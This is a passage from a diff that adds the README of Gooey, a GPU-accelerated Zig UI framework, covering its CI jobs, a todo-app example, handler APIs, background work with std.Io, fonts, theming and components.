+<td><code>test-linux</code></td>
+<td>Ubuntu</td>
+<td>Unit tests on Linux</td>
+</tr>
+<tr>
+<td><code>test-macos</code></td>
+<td>macOS</td>
+<td>Unit tests on macOS</td>
+</tr>
+<tr>
+<td><code>build-linux</code></td>
+<td>Ubuntu</td>
+<td>Build all optimization levels (Debug, ReleaseSafe, ReleaseFast, ReleaseSmall)</td>
+</tr>
+<tr>
+<td><code>build-macos</code></td>
+<td>macOS</td>
+<td>Build all optimization levels</td>
+</tr>
+<tr>
+<td><code>build-wasm</code></td>
+<td>Ubuntu</td>
+<td>WebAssembly targets</td>
+</tr>
+<tr>
+<td><code>valgrind</code></td>
+<td>Ubuntu</td>
+<td>Memory leak detection via valgrind</td>
+</tr>
+<tr>
+<td><code>zig-fmt</code></td>
+<td>Ubuntu</td>
+<td>Code formatting check</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Memory Leak Detection</h3><a aria-label="Permalink: Memory Leak Detection" href="#memory-leak-detection" id="user-content-memory-leak-detection"></a></p>
+<p dir="auto">Valgrind integration helps catch memory issues early:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="# Run tests with full leak checking
+zig build test-valgrind"><pre><span><span>#</span> Run tests with full leak checking</span>
+zig build test-valgrind</pre></div>
+<p dir="auto">The <code>valgrind.supp</code> file contains suppressions for known false positives from system libraries (Vulkan, Wayland, FreeType, HarfBuzz, etc.).</p>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Inspiration</h2><a aria-label="Permalink: Inspiration" href="#inspiration" id="user-content-inspiration"></a></p>
+<ul dir="auto">
+<li><a href="https://github.com/zed-industries/zed/tree/main/crates/gpui">GPUI</a> - Zed&#39;s GPU UI framework</li>
+<li><a href="https://github.com/nicbarker/clay">Clay</a> - Immediate mode layout</li>
+<li><a href="https://github.com/ghostty-org/ghostty">Ghostty</a> - Zig + Metal terminal</li>
+</ul>
+</article></div></div>`,content_text:`A GPU-accelerated UI framework for Zig, targeting macOS (Metal), Linux (Vulkan/Wayland), and Browser (WASM/WebGPU).
+Join the Gooey discord
+
+
+Early Development: API is evolving.
+
+
+Example app built with Gooey — chat-zig, an Anthropic Claude client using the Zig 0.16 std.Io stack for async HTTP:
+
+  
+
+Features
+
+GPU Rendering - Metal (macOS), Vulkan (Linux) with MSAA anti-aliasing (WebGPU/WASM is blocked upstream on Zig 0.16 — see WASM)
+Declarative UI - Component-based layout with ui.* primitives and flexbox-style system
+Cx/UI Separation - Cx for state, handlers, and focus; ui.* for layout primitives
+Pure State Pattern - Testable state methods with automatic re-rendering
+Animation System - Built-in animations with easing, animateOn triggers
+Entity System - Dynamic entity creation/deletion with auto-cleanup
+Retained Widgets - TextInput, TextArea, Checkbox, Scroll containers
+Text Rendering - CoreText (macOS), FreeType/HarfBuzz (Linux), Canvas (WASM)
+Custom Shaders - Drop in your own Metal/GLSL shaders
+Drag & Drop - Type-safe drag sources and drop targets with pointer_events control
+Liquid Glass - macOS 26.0+ Tahoe transparent window effects
+Actions & Keybindings - Contextual action system with keymap
+Theming - Built-in light/dark mode support
+Images & SVG - Load images and render SVG icons with styling
+File Dialogs - Native file open/save dialogs (macOS, Linux, WASM)
+Clipboard - Native clipboard support on all platforms
+IME Support - Input method editor for international text input
+Accessibility - Built-in screen reader support (VoiceOver, Orca, ARIA) with semantic roles and live regions
+Zero Dependencies - No external Zig packages; builds against system frameworks/libraries only (the Objective-C runtime bindings are vendored in-tree)
+
+Quick Start
+Requirements: Zig 0.16.0+
+Dependencies: None. Gooey has zero external Zig package dependencies — build.zig.zon lists no dependencies. It links only against platform system frameworks/libraries (see platform notes below).
+macOS: macOS 12.0+
+Linux: Wayland compositor, Vulkan drivers, FreeType, HarfBuzz, Fontconfig, libpng, D-Bus
+zig build run              # Showcase demo
+zig build run-counter      # Counter example
+zig build run-todo         # Todo app (state, handlers, TextInput, lists)
+zig build run-animation    # Animation demo
+zig build run-pomodoro     # Pomodoro timer
+zig build run-glass        # Liquid glass effect
+zig build run-spaceship    # Space dashboard with shader
+zig build run-dynamic-counters  # Entity system demo
+zig build run-layout       # Flexbox, shrink, text wrapping
+zig build run-actions      # Keybindings demo
+zig build run-select       # Dropdown select component
+zig build run-tooltip      # Tooltip component
+zig build run-modal        # Modal dialogs
+zig build run-images       # Image loading and styling
+zig build run-file-dialog  # Native file dialogs
+zig build run-uniform-list # Virtualized list (10k items)
+zig build run-virtual-list # Variable-height list
+zig build run-data-table   # Virtualized table (10k rows)
+zig build run-code-editor  # Code editor with syntax highlighting
+zig build test             # Run tests
+Example
+A small todo app that touches a representative slice of the API: a pure,
+UI-free state model; cx.update / cx.updateWith / cx.command handlers; a
+bound TextInput; Checkbox and Button; list iteration; and unit tests that
+exercise the state with no UI in play.
+The full, runnable source lives in src/examples/todo.zig
+(zig build run-todo). Its state model is covered by the tests shown at the
+bottom, which run as part of zig build test.
+const std = @import("std");
+const gooey = @import("gooey");
+
+const ui = gooey.ui;
+const Cx = gooey.Cx;
+const Button = gooey.components.Button;
+const Checkbox = gooey.components.Checkbox;
+const TextInput = gooey.components.TextInput;
+
+const MAX_TODOS = 64;
+const TEXT_CAP = 128;
+const draft_input_id = "new-todo";
+
+// State is pure — no UI knowledge, fully testable.
+const Todo = struct {
+    buf: [TEXT_CAP]u8 = [_]u8{0} ** TEXT_CAP,
+    len: usize = 0,
+    done: bool = false,
+
+    fn text(self: *const Todo) []const u8 {
+        return self.buf[0..self.len];
+    }
+};
+
+const Filter = enum { all, active, done };
+
+const AppState = struct {
+    todos: [MAX_TODOS]Todo = [_]Todo{.{}} ** MAX_TODOS,
+    count: usize = 0,
+    draft: []const u8 = "", // two-way bound to the TextInput
+    filter: Filter = .all,
+
+    // Pure logic — what the tests below drive.
+    fn pushTodo(self: *AppState, value: []const u8) void {
+        const trimmed = std.mem.trim(u8, value, " \\t\\r\\n");
+        if (trimmed.len == 0) return;
+        if (self.count >= MAX_TODOS) return;
+        const slot = &self.todos[self.count];
+        const n = @min(trimmed.len, TEXT_CAP);
+        @memcpy(slot.buf[0..n], trimmed[0..n]);
+        slot.len = n;
+        slot.done = false;
+        self.count += 1;
+    }
+
+    pub fn toggle(self: *AppState, index: usize) void {
+        if (index >= self.count) return;
+        self.todos[index].done = !self.todos[index].done;
+    }
+
+    pub fn remove(self: *AppState, index: usize) void {
+        if (index >= self.count) return;
+        var i = index;
+        while (i + 1 < self.count) : (i += 1) self.todos[i] = self.todos[i + 1];
+        self.count -= 1;
+    }
+
+    pub fn setFilter(self: *AppState, filter: Filter) void {
+        self.filter = filter;
+    }
+
+    pub fn clearCompleted(self: *AppState) void {
+        var write: usize = 0;
+        var read: usize = 0;
+        while (read < self.count) : (read += 1) {
+            if (!self.todos[read].done) {
+                self.todos[write] = self.todos[read];
+                write += 1;
+            }
+        }
+        self.count = write;
+    }
+
+    fn remaining(self: *const AppState) u32 {
+        var n: u32 = 0;
+        for (self.todos[0..self.count]) |*t| {
+            if (!t.done) n += 1;
+        }
+        return n;
+    }
+
+    fn visible(self: *const AppState, t: *const Todo) bool {
+        return switch (self.filter) {
+            .all => true,
+            .active => !t.done,
+            .done => t.done,
+        };
+    }
+
+    // Command — needs framework access (the binding only flows widget -> state,
+    // so we reach the retained input widget to clear it after adding).
+    pub fn addTodo(self: *AppState, g: *gooey.Window) void {
+        self.pushTodo(self.draft);
+        self.draft = "";
+        if (g.widgetState(gooey.widgets.TextInputState, draft_input_id)) |input| {
+            input.clear();
+        }
+    }
+};
+
+var state = AppState{};
+
+const App = gooey.App(AppState, &state, render, .{
+    .title = "Todos",
+    .width = 480,
+    .height = 560,
+});
+
+comptime {
+    _ = App; // Force analysis (also wires @export on WASM).
+}
+
+pub fn main(init: std.process.Init) !void {
+    return App.main(init);
+}
+
+fn render(cx: *Cx) void {
+    const s = cx.state(AppState);
+    const size = cx.windowSize();
+
+    cx.render(ui.box(.{
+        .width = size.width,
+        .height = size.height,
+        .direction = .column,
+        .padding = .{ .all = 24 },
+        .gap = 16,
+        .background = ui.Color.rgb(0.96, 0.96, 0.97),
+    }, .{
+        ui.text("Todos", .{ .size = 28 }),
+
+        // Input row: TextInput binds to state.draft; Add is a command.
+        ui.hstack(.{ .gap = 8, .alignment = .center }, .{
+            TextInput{ .id = draft_input_id, .placeholder = "What needs doing?", .bind = &s.draft, .fill_width = true },
+            Button{ .label = "Add", .on_click_handler = cx.command(AppState.addTodo) },
+        }),
+
+        // Filters: each button packs its enum value into the handler arg.
+        ui.hstack(.{ .gap = 8 }, .{
+            FilterButton{ .label = "All", .filter = .all, .active = s.filter == .all },
+            FilterButton{ .label = "Active", .filter = .active, .active = s.filter == .active },
+            FilterButton{ .label = "Done", .filter = .done, .active = s.filter == .done },
+        }),
+
+        // The list, or an empty-state hint.
+        ui.when(s.count == 0, .{
+            ui.text("Nothing yet — add your first todo above.", .{ .size = 14 }),
+        }),
+        TodoItems{},
+
+        ui.spacer(),
+        ui.hstack(.{ .gap = 12, .alignment = .center }, .{
+            ui.textFmt("{d} left", .{s.remaining()}, .{ .size = 14 }),
+            ui.spacer(),
+            Button{ .label = "Clear completed", .variant = .secondary, .size = .small, .on_click_handler = cx.update(AppState.clearCompleted) },
+        }),
+    }));
+}
+
+// Iteration lives in a component because each row needs \`cx\` for its handlers.
+const TodoItems = struct {
+    pub fn render(_: @This(), cx: *Cx) void {
+        const s = cx.state(AppState);
+        for (s.todos[0..s.count], 0..) |*todo, index| {
+            if (!s.visible(todo)) continue;
+            cx.render(TodoRow{ .index = index, .done = todo.done, .label = todo.text() });
+        }
+    }
+};
+
+const TodoRow = struct {
+    index: usize,
+    done: bool,
+    label: []const u8,
+
+    pub fn render(self: @This(), cx: *Cx) void {
+        // A background + cross-axis centering means this is a \`box\` (with
+        // \`.direction = .row\`), not an \`hstack\` — stacks carry only gap/
+        // alignment/padding.
+        cx.render(ui.box(.{
+            .direction = .row,
+            .gap = 12,
+            .alignment = .{ .cross = .center },
+            .padding = .{ .all = 10 },
+            .background = ui.Color.white,
+            .corner_radius = 8,
+        }, .{
+            Checkbox{ .checked = self.done, .on_click_handler = cx.updateWith(self.index, AppState.toggle) },
+            ui.text(self.label, .{ .size = 16 }),
+            ui.spacer(),
+            Button{ .label = "Delete", .variant = .danger, .size = .small, .on_click_handler = cx.updateWith(self.index, AppState.remove) },
+        }));
+    }
+};
+
+const FilterButton = struct {
+    label: []const u8,
+    filter: Filter,
+    active: bool,
+
+    pub fn render(self: @This(), cx: *Cx) void {
+        cx.render(Button{
+            .label = self.label,
+            .size = .small,
+            .variant = if (self.active) .primary else .secondary,
+            .on_click_handler = cx.updateWith(self.filter, AppState.setFilter),
+        });
+    }
+};
+
+// State is testable without UI.
+test "remove keeps the list contiguous" {
+    var s = AppState{};
+    s.pushTodo("a");
+    s.pushTodo("b");
+    s.pushTodo("c");
+    s.remove(1); // drop "b"
+    try std.testing.expectEqual(@as(usize, 2), s.count);
+    try std.testing.expectEqualStrings("a", s.todos[0].text());
+    try std.testing.expectEqualStrings("c", s.todos[1].text());
+}
+
+test "remaining and clearCompleted" {
+    var s = AppState{};
+    s.pushTodo("a");
+    s.pushTodo("b");
+    s.toggle(0);
+    try std.testing.expectEqual(@as(u32, 1), s.remaining());
+    s.clearCompleted();
+    try std.testing.expectEqual(@as(usize, 1), s.count);
+    try std.testing.expectEqualStrings("b", s.todos[0].text());
+}
+API Pattern
+Gooey separates concerns between Cx (context) and ui (layout primitives):
+
+
+
+Module
+Purpose
+Examples
+
+
+
+
+cx.*
+State, handlers, animations, focus
+cx.state(), cx.update(), cx.animate(), cx.changed(), cx.render()
+
+
+ui.*
+Layout containers and primitives
+ui.box(), ui.rect(), ui.hstack(), ui.vstack(), ui.text(), ui.when()
+
+
+
+fn render(cx: *Cx) void {
+    const s = cx.state(AppState);
+
+    cx.render(ui.box(.{ .width = 100 }, .{
+        ui.text("Hello", .{}),
+
+        // Conditional rendering
+        ui.when(s.show_extra, .{
+            ui.text("Extra content", .{}),
+        }),
+
+        // Iterate over items
+        ui.each(&s.items, struct {
+            fn render(item: Item, _: usize) @TypeOf(ui.text("", .{})) {
+                return ui.text(item.name, .{});
+            }
+        }.render),
+    }));
+}
+
+Key primitives:
+
+ui.box() - Container with flexbox layout
+ui.rect() - Childless box (dividers, spacers, colored blocks)
+ui.hstack() / ui.vstack() - Horizontal/vertical stacks
+ui.text() / ui.textFmt() - Text rendering
+ui.when(cond, children) - Conditional rendering
+ui.maybe(optional, fn) - Render if optional has value
+ui.each(items, fn) - Render for each item
+ui.scroll(id, style, children) - Scrollable container
+ui.spacer() - Flexible space
+
+Handler Types
+
+
+
+Method
+Signature
+Use Case
+
+
+
+
+cx.update()
+fn(*State) void
+Pure state mutations
+
+
+cx.updateWith()
+fn(*State, Arg) void
+Mutations with argument
+
+
+cx.command()
+fn(*State, *Gooey) void
+Framework access (focus, quit, entities)
+
+
+cx.commandWith()
+fn(*State, *Gooey, Arg) void
+Framework access with argument
+
+
+cx.defer()
+fn(*State, *Gooey) void
+Run after current event completes
+
+
+cx.deferWith()
+fn(*State, *Gooey, Arg) void
+Deferred with argument
+
+
+
+
+Note: The state type is inferred automatically from the method pointer's first parameter — no need to pass it separately.
+
+Handlers with Arguments
+The *With variants (updateWith, commandWith, deferWith) let you pass data to your handler. The argument is captured at handler creation time and passed when invoked:
+// In a list render callback - capture the index
+.on_click_handler = cx.updateWith(index, State.selectItem),
+
+// The handler receives the captured value
+pub fn selectItem(self: *State, index: u32) void {
+    self.selected = index;
+}
+The 8-byte limit: Arguments are packed into a u64 for zero-allocation storage. This means your argument must be ≤8 bytes. If it exceeds this, you'll get a compile error:
+error: updateWith: argument type 'MyLargeStruct' exceeds 8 bytes. Use a pointer or index instead.
+
+What fits in 8 bytes:
+
+
+
+Type
+Size
+✓/✗
+
+
+
+
+u8, i8, bool
+1 byte
+✓
+
+
+u16, i16
+2 bytes
+✓
+
+
+u32, i32, f32
+4 bytes
+✓
+
+
+u64, i64, f64
+8 bytes
+✓
+
+
+usize (64-bit)
+8 bytes
+✓
+
+
+*T (any pointer)
+8 bytes
+✓
+
+
+struct { x: u32, y: u32 }
+8 bytes
+✓
+
+
+[2]u32
+8 bytes
+✓
+
+
+struct { a: u32, b: u32, c: u32 }
+12 bytes
+✗
+
+
+
+Workarounds for larger data:
+// Option 1: Use an index into your data
+.on_click_handler = cx.updateWith(row_index, State.selectRow),
+
+// Option 2: Use a pointer (if the data outlives the handler)
+.on_click_handler = cx.updateWith(&self.items[i], State.editItem),
+
+// Option 3: Store data in state, pass an ID
+pub fn openFile(self: *State, file_id: u32) void {
+    const file = self.files.get(file_id) orelse return;
+    // ... use file.path, file.name, etc.
+}
+Deferred Commands
+Use defer when you need to run code after the current event handler completes. This is essential for:
+
+Modal dialogs - They run their own event loop, which would deadlock if called during event handling
+File pickers - Same reason as modals
+Heavy operations - Defer work to avoid blocking the current frame
+
+// In a command handler, use g.deferCommand():
+pub fn openFolder(self: *State, g: *Gooey) void {
+    _ = self;
+    g.deferCommand(State, State.openFolderDeferred);
+}
+
+fn openFolderDeferred(self: *State, g: *Gooey) void {
+    _ = g;
+    // Safe to open modal dialog here - we're outside event handling
+    const file_dialog = gooey.file_dialog;
+    if (file_dialog.promptForPaths(allocator, .{ .directories = true })) |result| {
+        defer result.deinit();
+        const path = result.paths[0];
+        self.loadDirectory(path);
+    }
+}
+
+// With an argument (same 8-byte limit applies):
+pub fn deleteItem(self: *State, g: *Gooey, index: u32) void {
+    _ = self;
+    g.deferCommandWith(State, u32, index, State.confirmDelete);
+}
+
+fn confirmDelete(self: *State, g: *Gooey, index: u32) void {
+    _ = g;
+    if (dialog.confirm("Delete item?")) {
+        self.items.remove(index);
+    }
+}
+The deferred command queue holds up to 32 commands and is flushed after each event cycle.
+Background Work (Io.Queue / Io.Group)
+Run expensive work — network requests, file I/O, heavy computation — off the UI thread using Zig 0.16's std.Io. The framework owns no executor of its own: background tasks are spawned with cx.io().async(...), hand their results back through a bounded std.Io.Queue(T), and the render loop drains that queue each frame. Background tasks never touch UI state directly — they only push typed results — so there are no locks on your state.
+This is the same pattern src/image/loader.zig uses for async image URL fetches.
+// A typed result the background task hands back to the render loop.
+const Fetch = union(enum) {
+    ok: []const u8,
+    failed,
+};
+
+const State = struct {
+    // Fixed-capacity, statically-backed channel — no allocation after init.
+    result_buffer: [16]Fetch = undefined,
+    result_queue: std.Io.Queue(Fetch) = undefined,
+
+    // Owns the in-flight task(s) so they can be cancelled together.
+    fetch_group: std.Io.Group = .init,
+
+    response: []const u8 = "",
+
+    // Kick off background work from a handler — runs off the UI thread.
+    pub fn startFetch(self: *State, cx: *Cx) void {
+        const url = "https://api.example.com/data";
+        self.result_queue = .init(&self.result_buffer);
+
+        // \`io\` is passed twice: once to drive \`async\`, and again inside the
+        // args tuple so the task body can push into the queue.
+        self.fetch_group.async(cx.io(), fetchData, .{ cx.io(), url, &self.result_queue });
+
+        // Auto-cancel on window close so a late task can't write into freed state.
+        cx.registerCancelGroup(&self.fetch_group);
+    }
+};
+
+// Background task — never touches UI state, only pushes a typed result.
+fn fetchData(io: std.Io, url: []const u8, queue: *std.Io.Queue(Fetch)) void {
+    const body = httpGet(io, url) catch {
+        queue.putOneUncancelable(io, .failed) catch {};
+        return;
+    };
+    queue.putOneUncancelable(io, .{ .ok = body }) catch {};
+}
+
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+
+    // Non-blocking drain — safe to call every frame from \`render\`.
+    var buffer: [16]Fetch = undefined;
+    for (cx.drainQueue(Fetch, &s.result_queue, &buffer)) |result| switch (result) {
+        .ok => |body| s.response = body,
+        .failed => {},
+    }
+
+    // ... build UI from s.response ...
+}
+Key pieces:
+
+cx.io() — the std.Io instance threaded through the framework from main(). Pass it to async, queue, and timing calls.
+cx.io().async(fn, .{args}) (or group.async(io, fn, .{args})) — spawn background work. Pass io inside the args tuple too if the task needs to push into a queue.
+std.Io.Queue(T) — bounded, lock-free, statically-backed channel. Tasks push with putOneUncancelable(io, value); capacity is fixed at init (no allocation afterward).
+cx.drainQueue(T, &queue, &buffer) — non-blocking drain into your buffer; returns an empty slice when nothing is ready, so it's safe to call every frame.
+std.Io.Group — owns one or more in-flight tasks so they can be cancelled together.
+cx.registerCancelGroup(&group) — auto-cancel a group on window close (pair with cx.unregisterCancelGroup if the work finishes normally). For per-entity lifecycles, use cx.entities.attachCancel(id, &group) to cancel when the entity is removed.
+
+
+Note: This rides on Zig 0.16's std.Io, so the threaded backend is unavailable on WASM (single-threaded) — see WASM. The earlier cx.dispatchBackground / dispatchOnMainThread / dispatchAfter APIs were removed in the std.Io migration; the Io.Queue + Io.Group pattern above replaces them. See docs/zig-0.16-io-migration.md.
+
+Fonts
+By default, Gooey uses the platform's system sans-serif font (e.g., DejaVu Sans on Linux, SF Pro on macOS, system-ui on web). You can set a custom font at app init or switch fonts at runtime.
+App-Level Font
+Set .font in your app config to use any font installed on the system:
+const App = gooey.App(AppState, &state, render, .{
+    .title = "My App",
+    .font = "Inter",
+    .font_size = 16.0,   // optional, defaults to 16.0
+});
+Omitting .font uses the platform default. On Linux, any font discoverable by Fontconfig works — install fonts via your package manager (e.g., sudo apt install fonts-inter) or drop .ttf/.otf files into ~/.local/share/fonts/.
+Runtime Font Switching
+Change the font on the fly from any event handler:
+fn onSettingsChanged(cx: *Cx) void {
+    const s = cx.state(AppState);
+    cx.setFont(s.font_name, s.font_size) catch {};
+}
+This clears the glyph and shape caches and triggers a re-render automatically. All text in the UI updates immediately.
+Platform Details
+
+
+
+Platform
+Font Discovery
+System Sans-Serif
+
+
+
+
+Linux
+Fontconfig
+sans-serif (typically DejaVu Sans or Noto Sans)
+
+
+macOS
+CoreText
+SF Pro
+
+
+Web
+CSS font stack
+system-ui, -apple-system, sans-serif
+
+
+
+
+Note: Gooey currently uses a single global font. Per-component font families (e.g., mixing a serif body font with a monospace code font) are not yet supported — components expose font_size but not font_family.
+
+Theming
+Gooey ships with two built-in themes — Theme.light (Catppuccin Latte) and Theme.dark (Catppuccin Macchiato). Set the active theme before rendering:
+fn render(cx: *Cx) void {
+    cx.setTheme(if (s.dark_mode) &Theme.dark else &Theme.light);
+    // ...
+}
+Custom Themes
+Define a light/dark pair of Theme values and swap between them the same way as the built-ins. Every field has a semantic role so components resolve colors automatically without per-component overrides:
+const my_light = gooey.Theme{
+    .bg      = Color.rgb(0.97, 0.97, 0.98),
+    .surface = Color.rgb(0.93, 0.93, 0.95),
+    .overlay = Color.rgb(0.88, 0.88, 0.91),
+
+    .primary   = Color.rgb(0.20, 0.50, 0.90),
+    .secondary = Color.rgb(0.45, 0.48, 0.58),
+    .accent    = Color.rgb(0.55, 0.25, 0.85),
+    .success   = Color.rgb(0.20, 0.65, 0.30),
+    .warning   = Color.rgb(0.85, 0.60, 0.10),
+    .danger    = Color.rgb(0.82, 0.24, 0.24),
+
+    .text    = Color.rgb(0.15, 0.15, 0.20),
+    .subtext = Color.rgb(0.35, 0.37, 0.45),
+    .muted   = Color.rgb(0.55, 0.57, 0.65),
+
+    .border       = Color.rgba(0.55, 0.57, 0.65, 0.3),
+    .border_focus = Color.rgb(0.20, 0.50, 0.90),
+
+    .radius_sm = 4,
+    .radius_md = 8,
+    .radius_lg = 16,
+
+    .font_size_base = 14,
+};
+
+const my_dark = gooey.Theme{
+    .bg      = Color.rgb(0.10, 0.10, 0.12),
+    .surface = Color.rgb(0.15, 0.15, 0.18),
+    .overlay = Color.rgb(0.20, 0.20, 0.24),
+
+    .primary   = Color.rgb(0.40, 0.70, 1.00),
+    .secondary = Color.rgb(0.45, 0.48, 0.58),
+    .accent    = Color.rgb(0.75, 0.55, 0.95),
+    .success   = Color.rgb(0.45, 0.85, 0.55),
+    .warning   = Color.rgb(0.95, 0.80, 0.35),
+    .danger    = Color.rgb(0.95, 0.40, 0.40),
+
+    .text    = Color.rgb(0.92, 0.92, 0.95),
+    .subtext = Color.rgb(0.70, 0.72, 0.80),
+    .muted   = Color.rgb(0.50, 0.52, 0.60),
+
+    .border       = Color.rgba(0.50, 0.52, 0.60, 0.3),
+    .border_focus = Color.rgb(0.40, 0.70, 1.00),
+
+    .radius_sm = 4,
+    .radius_md = 8,
+    .radius_lg = 16,
+
+    .font_size_base = 14,
+};
+
+fn render(cx: *Cx) void {
+    cx.setTheme(if (s.dark_mode) &my_dark else &my_light);
+    // ...
+}
+Base Font Size
+The font_size_base field (default 14) is the single source of truth for text sizing across components. Components scale relative to it — for example, Button derives its per-size font sizes as:
+
+
+
+Button size
+Font size
+
+
+
+
+.small
+base - 2 (12)
+
+
+.medium
+base (14)
+
+
+.large
+base + 2 (16)
+
+
+
+Set it once in your theme and every component scales consistently — no per-component font size overrides needed:
+const large_text_theme = gooey.Theme{
+    // ...colors...
+    .font_size_base = 18,  // small=16, medium=18, large=20
+};
+Components
+Gooey includes ready-to-use components:
+Button
+// Button variants
+Button{ .label = "Save", .variant = .primary, .on_click_handler = cx.update(State.save) }
+Button{ .label = "Cancel", .variant = .secondary, .size = .small, .on_click_handler = ... }
+Button{ .label = "Delete", .variant = .danger, .on_click_handler = ... }
+TextInput & TextArea
+// Single-line text input with binding
+TextInput{
+    .id = "email",
+    .placeholder = "Enter email...",
+    .bind = &s.email,
+    .width = 250,
+}
+
+// Multi-line text area
+TextArea{
+    .id = "notes",
+    .placeholder = "Enter notes...",
+    .bind = &s.notes,
+    .width = 400,
+    .height = 200,
+}
+Checkbox
+Checkbox{
+    .id = "terms",
+    .checked = s.agreed_to_terms,
+    .on_click_handler = cx.update(State.toggleTerms),
+}
+RadioButton & RadioGroup
+// RadioButton - individual buttons for custom layouts
+RadioButton{
+    .label = "Email",
+    .is_selected = s.contact_method == 0,
+    .on_click_handler = cx.updateWith(@as(u8, 0), State.setContactMethod),
+}
+
+// RadioGroup - grouped buttons with handlers array
+RadioGroup{
+    .id = "priority",
+    .options = &.{ "Low", "Medium", "High" },
+    .selected = s.priority,
+    .handlers = &.{
+        cx.updateWith(@as(u8, 0), State.setPriority),
+        cx.updateWith(@as(u8, 1), State.setPriority),
+        cx.updateWith(@as(u8, 2), State.setPriority),
+    },
+    .direction = .row,  // or .column
+    .gap = 16,
+}
+Select (Dropdown)
+const State = struct {
+    selected_fruit: ?usize = null,
+
+    pub fn selectFruit(self: *State, index: usize) void {
+        self.selected_fruit = index;
+    }
+};
+
+// In render:
+Select{
+    .id = "fruit-select",
+    .options = &.{ "Apple", "Banana", "Cherry", "Date" },
+    .selected = s.selected_fruit,
+    .placeholder = "Choose a fruit...",
+    .on_select = cx.onSelect(State.selectFruit),
+    .width = 200,
+}
+The widget manages open/close state internally — no toggle/close handlers or per-option handler arrays needed. Just provide on_select and a single handler that receives the selected index.
+
+Legacy API: The explicit is_open / on_toggle_handler / on_close_handler / handlers fields are still supported for full manual control.
+
+Modal
+const State = struct {
+    show_confirm: bool = false,
+
+    pub fn openConfirm(self: *State) void {
+        self.show_confirm = true;
+    }
+
+    pub fn closeConfirm(self: *State) void {
+        self.show_confirm = false;
+    }
+};
+
+// Trigger button
+Button{ .label = "Delete Item", .variant = .danger, .on_click_handler = cx.update(State.openConfirm) }
+
+// Modal with custom content
+Modal(ConfirmContent){
+    .id = "confirm-dialog",
+    .is_open = s.show_confirm,
+    .on_close = cx.update(State.closeConfirm),
+    .child = ConfirmContent{
+        .message = "Are you sure you want to delete?",
+        .on_confirm = cx.update(State.doDelete),
+        .on_cancel = cx.update(State.closeConfirm),
+    },
+    .animate = true,
+    .close_on_backdrop = true,
+}
+Tooltip
+// Wrap any component with a tooltip
+Tooltip(Button){
+    .text = "Click to save your changes",
+    .child = Button{ .label = "Save", .on_click_handler = ... },
+    .position = .top,  // .top, .bottom, .left, .right
+}
+
+// With custom styling
+Tooltip(IconButton){
+    .text = "This field is required",
+    .child = HelpIcon{},
+    .position = .right,
+    .max_width = 200,
+    .background = Color.rgb(0.2, 0.2, 0.25),
+}
+Image
+// Simple image from path
+gooey.Image{ .src = "assets/logo.png" }
+
+// With explicit sizing
+gooey.Image{ .src = "photo.jpg", .width = 200, .height = 150 }
+
+// Rounded avatar
+gooey.Image{ .src = "avatar.png", .size = 48, .rounded = true }
+
+// Cover image (fills container, may crop)
+gooey.Image{ .src = "banner.jpg", .width = 800, .height = 200, .fit = .cover }
+
+// With effects
+gooey.Image{
+    .src = "icon.png",
+    .size = 64,
+    .grayscale = 1.0,           // 0.0 = color, 1.0 = grayscale
+    .tint = gooey.Color.blue,   // Color overlay
+    .opacity = 0.8,
+    .corner_radius = 8,
+}
+SVG Icons
+const gooey = @import("gooey");
+const Svg = gooey.Svg;
+const Icons = gooey.Icons;
+
+// Using built-in icon paths
+Svg{ .path = Icons.star, .size = 24, .color = Color.gold }
+Svg{ .path = Icons.check, .size = 20, .color = Color.green }
+Svg{ .path = Icons.close, .size = 16, .color = Color.red }
+
+// Stroked icon (outline only)
+Svg{ .path = Icons.star_outline, .size = 24, .stroke_color = Color.white, .stroke_width = 2 }
+
+// Both fill and stroke
+Svg{ .path = Icons.favorite, .size = 24, .color = Color.red, .stroke_color = Color.black, .stroke_width = 1 }
+
+// Available icons: arrow_back, arrow_forward, menu, close, more_vert,
+// check, add, remove, edit, delete, search, star, star_outline, favorite,
+// info, warning, error_icon, play, pause, skip_next, skip_prev, volume_up,
+// visibility, visibility_off, folder, file, download, upload
+ProgressBar
+ProgressBar{
+    .progress = s.completion,  // 0.0 to 1.0
+    .width = 200,
+    .height = 8,
+    .corner_radius = 4,
+}
+Tabs
+// Individual tabs for custom navigation
+cx.render(ui.hstack(.{ .gap = 4 }, .{
+    Tab{
+        .label = "Home",
+        .is_active = s.tab == 0,
+        .on_click_handler = cx.updateWith(@as(u8, 0), State.setTab),
+    },
+    Tab{
+        .label = "Settings",
+        .is_active = s.tab == 1,
+        .on_click_handler = cx.updateWith(@as(u8, 1), State.setTab),
+        .style = .underline,  // .pills (default), .underline, .segmented
+    },
+}))
+UniformList
+Virtualized list for efficiently rendering large datasets with uniform item heights. Only visible items are rendered, regardless of total count. The render callback receives *Cx for full access to state and handlers.
+const State = struct {
+    list_state: UniformListState = UniformListState.init(10_000, 32.0), // count, item height
+    selected: ?u32 = null,
+
+    pub fn scrollToTop(self: *State) void {
+        self.list_state.scrollToTop();
+    }
+
+    pub fn scrollToMiddle(self: *State) void {
+        self.list_state.scrollToItem(5000, .center);
+    }
+
+    pub fn selectItem(self: *State, index: u32) void {
+        self.selected = index;
+    }
+};
+
+// In render function:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    cx.uniformList("my-list", &s.list_state, .{
+        .fill_width = true,
+        .grow_height = true,
+    }, renderItem);
+}
+
+fn renderItem(index: u32, cx: *Cx) void {
+    const s = cx.stateConst(State);
+    const theme = cx.theme();
+    const is_selected = if (s.selected) |sel| sel == index else false;
+
+    // Color is available via: const Color = gooey.Color;
+    const text_color = if (is_selected) Color.white else theme.text;
+
+    cx.render(ui.box(.{
+        .fill_width = true,
+        .height = 32,
+        .background = if (is_selected) theme.primary else null,
+        .hover_background = theme.overlay,
+        .on_click_handler = cx.updateWith(index, State.selectItem),
+    }, .{
+        ui.text("Item", .{ .color = text_color }),
+    }));
+}
+VirtualList
+Virtualized list supporting variable item heights. Heights are cached after rendering for efficient scroll calculations. Ideal for chat messages or expandable rows. The callback must return the rendered height.
+const State = struct {
+    list_state: VirtualListState = VirtualListState.init(1000, 48.0), // count, default height
+};
+
+// In render function - callback returns item height:
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+    cx.virtualList("chat-list", &s.list_state, .{ .grow_height = true }, renderMessage);
+}
+
+fn renderMessage(index: u32, cx: *Cx) f32 {
